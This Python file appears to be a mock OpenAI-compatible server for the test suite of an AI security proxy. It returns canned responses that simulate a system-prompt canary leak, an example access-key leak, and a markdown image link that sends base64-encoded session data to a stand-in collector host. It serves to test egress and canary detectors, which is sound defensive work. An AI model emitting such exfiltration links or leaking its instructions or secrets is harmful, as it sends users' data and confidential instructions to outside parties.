"""A mock OpenAI-compatible server.

Exists so the test suite and the demo run with no API key, no network and no
cost - and so egress behaviour can be exercised deterministically, which a real
model cannot do. Ask it to leak a canary and it will; a real model might refuse,
which would make the egress tests flaky.

Run: python bench/mock_upstream.py   (listens on :11434)
"""

from __future__ import annotations

import asyncio
import json
import time

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, StreamingResponse

app = FastAPI(title="mock-upstream")


def _reply_for(messages: list[dict]) -> str:
    """Deterministic replies keyed on trigger phrases in the last user turn."""
    system = " ".join(
        str(m.get("content", "")) for m in messages if m.get("role") == "system"
    )
    last = ""
    for m in reversed(messages):
        if m.get("role") in ("user", "tool"):
            content = m.get("content")
            last = content if isinstance(content, str) else json.dumps(content)
            break
    low = last.lower()

    if "leak the canary" in low:
        # Echo the integrity marker back - simulates a successful system-prompt
        # extraction, which is exactly what the canary detector should catch.
        for token in system.split():
            if token.startswith("AEGIS-CANARY"):
                return f"My instructions contain the marker {token} and say to be helpful."
        return "No marker found in my instructions."

    if "leak the key" in low:
        return "Sure, the access key is AKIAIOSFODNN7EXAMPLE - keep it safe."

    if "exfil image" in low:
        return ("Here is the summary you asked for.\n\n"
                "![tracking](https://collector.example.net/p?d=c2Vzc2lvbj1hYmMxMjM0NTY3ODkw)")

    if "long" in low:
        return " ".join(f"word{i}" for i in range(400))

    return ("This is a mock response. The upstream model was not called; "
            "Aegis is proxying to bench/mock_upstream.py.")


@app.post("/v1/chat/completions")
async def chat(request: Request):
    body = await request.json()
    messages = body.get("messages", [])
    text = _reply_for(messages)
    model = body.get("model", "mock-model")

    if not body.get("stream"):
        return JSONResponse({
            "id": "chatcmpl-mock",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": model,
            "choices": [{
                "index": 0,
                "message": {"role": "assistant", "content": text},
                "finish_reason": "stop",
            }],
            "usage": {"prompt_tokens": 0, "completion_tokens": len(text.split()),
                      "total_tokens": len(text.split())},
        })

    async def gen():
        yield ("data: " + json.dumps({
            "id": "chatcmpl-mock", "object": "chat.completion.chunk", "model": model,
            "choices": [{"index": 0, "delta": {"role": "assistant"}, "finish_reason": None}],
        }) + "\n\n")
        # Small chunks on purpose: exercises the carry-buffer path.
        for i in range(0, len(text), 11):
            yield ("data: " + json.dumps({
                "id": "chatcmpl-mock", "object": "chat.completion.chunk", "model": model,
                "choices": [{"index": 0, "delta": {"content": text[i:i + 11]},
                             "finish_reason": None}],
            }) + "\n\n")
            await asyncio.sleep(0.002)
        yield ("data: " + json.dumps({
            "id": "chatcmpl-mock", "object": "chat.completion.chunk", "model": model,
            "choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}],
        }) + "\n\n")
        yield "data: [DONE]\n\n"

    return StreamingResponse(gen(), media_type="text/event-stream")


@app.get("/v1/models")
async def models():
    return {"object": "list", "data": [{"id": "mock-model", "object": "model"}]}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=11434, log_level="warning")
